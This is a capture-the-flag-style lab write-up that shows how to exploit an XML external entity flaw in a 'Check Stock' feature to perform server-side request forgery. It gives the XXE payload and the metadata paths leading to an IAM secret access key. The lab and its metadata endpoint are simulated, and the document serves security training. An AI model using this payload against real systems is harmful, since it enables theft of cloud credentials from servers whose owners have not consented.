# Exploiting XXE to perform SSRF attacks
* This lab has a "Check Stock" feature that parses XML input and returns any unexpected values in the response.
	* The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
	* To solve the lab, exploit XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.
	
### 1. Capture _POST /check/stock_ and send it to repeater to modify

![5](https://user-images.githubusercontent.com/53956303/152625177-c40a85b7-0394-481a-b377-fb684bc457eb.png)
### 2. Declare an external entity definition
* Declare it after XML declaration
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
### 3. Modify the value of _productId_ from 1 to `&xxe;`
* Then, send the request.

![6](https://user-images.githubusercontent.com/53956303/152625482-474d8c1e-1c76-4230-a495-944c62423db1.png)
* From the result, a directory name `latest` is found

### 4. Repeat #3 again with updating URL in the DTD untill the target file is obtained
* `/latest`

![7](https://user-images.githubusercontent.com/53956303/152625576-b20ad6a3-3a8a-413f-b0e2-84c77ea2e735.png)
* `/latest/meta-data`

![8](https://user-images.githubusercontent.com/53956303/152625601-87eccc7f-2c5f-47e3-abbe-81f30a1889ae.png)
* `/latest/meta-data/iam`

![9](https://user-images.githubusercontent.com/53956303/152625616-df773217-fe38-4a2c-bab1-4ca31d9dc341.png)
* `/latest/meta-data/iam/security-credentials`

![10](https://user-images.githubusercontent.com/53956303/152625634-b4fb2dc3-576f-4567-b7c8-abaf16c3ade9.png)
* `/latest/meta-data/iam/security-credentials/admin`

![11](https://user-images.githubusercontent.com/53956303/152625669-a58005c5-c125-4e90-b28f-cb17255f770a.png)
* From the result, a JSON file contains _SecretAccessKey_ is found. As a result, the lab is solved

![12](https://user-images.githubusercontent.com/53956303/152625717-564aa392-d7cb-4a8c-8519-96226909bdc5.png)
